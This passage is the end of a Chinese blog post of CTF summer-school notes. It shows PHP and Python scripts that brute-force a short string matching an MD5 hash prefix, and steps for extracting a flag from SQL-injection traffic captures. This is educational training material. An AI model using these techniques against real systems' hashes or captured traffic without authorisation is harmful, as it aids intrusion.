+</span></span><span class=line><span class=cl>  <span class=k>for</span><span class=p>(</span><span class=nv>$j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$j</span> <span class=o>&lt;</span> <span class=nv>$len</span><span class=o>-</span><span class=mi>1</span><span class=p>;</span> <span class=o>++</span><span class=nv>$j</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$k</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$k</span> <span class=o>&lt;</span> <span class=nv>$len</span><span class=o>-</span><span class=mi>1</span><span class=p>;</span> <span class=o>++</span><span class=nv>$k</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>for</span><span class=p>(</span><span class=nv>$l</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$l</span> <span class=o>&lt;</span> <span class=nv>$len</span><span class=o>-</span><span class=mi>1</span><span class=p>;</span> <span class=o>++</span><span class=nv>$l</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$ret</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$str</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>.</span><span class=nv>$str</span><span class=p>[</span><span class=nv>$j</span><span class=p>]</span><span class=o>.</span><span class=nv>$str</span><span class=p>[</span><span class=nv>$k</span><span class=p>]</span><span class=o>.</span><span class=nv>$str</span><span class=p>[</span><span class=nv>$l</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$ret</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>10</span><span class=p>)</span> <span class=o>==</span> <span class=s1>&#39;c2979c7124&#39;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=k>echo</span> <span class=nv>$ret</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=k>die</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>比较舒服的 python 版本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s1>&#39;c2979c7124&#39;</span>
+</span></span><span class=line><span class=cl><span class=nb>dir</span> <span class=o>=</span> <span class=s1>&#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>dir_list</span> <span class=o>=</span> <span class=n>itertools</span><span class=o>.</span><span class=n>product</span><span class=p>(</span><span class=nb>dir</span><span class=p>,</span> <span class=n>repeat</span><span class=o>=</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>dir_list</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>	<span class=n>res</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>i</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=n>res</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>10</span><span class=p>]</span> <span class=o>==</span> <span class=n>key</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>		<span class=nb>print</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>		<span class=nb>print</span> <span class=n>res</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=sql-注入流量包分析>SQL 注入流量包分析</h3><ol><li>过滤出 http 数据包。</li><li>定位关键的注入数据包所在的区间，观察注入语句判断是否是盲注。</li><li>非盲注：关注响应信息，直接在响应信息中得到 flag。</li><li>盲注：关注注入语句，导出 HTTP 对象到 txt 并写脚本分析出 flag。</li></ol><h2 id=总结>总结</h2><p>暑期学校主要还是面向零基础的同学，因此能学到的东西不算太多。接下来应该会重点学习各类工具的使用。</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2019-07-23</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/kali/>Kali</a>,&nbsp;<a href=/tags/hash/>Hash</a>,&nbsp;<a href=/tags/javascript/>Javascript</a>,&nbsp;<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>反序列化</a>,&nbsp;<a href=/tags/rsa/>RSA</a>,&nbsp;<a href=/tags/sqli/>SQLi</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/beef-msf/ class=prev rel=prev title="Beef 加载 Metasploit 插件 & Metasploit 连接 PostgreSQL"><i class="fas fa-angle-left fa-fw"></i>Beef 加载 Metasploit 插件 & Metasploit 连接 PostgreSQL</a>
+<a href=/shiyanba-web/ class=next rel=next title="实验吧 Web 练习记录">实验吧 Web 练习记录<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.94.0">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2017 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Mercury</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/valine/Valine.min.js></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/auto-render.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:30},comment:{valine:{appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:10,placeholder:"你的评论 ...",recordIP:!1,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"P149SBLX5U",algoliaIndex:"blog",algoliaSearchKey:"cbd5db1f3910ee11bc18688f21b64bd4",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
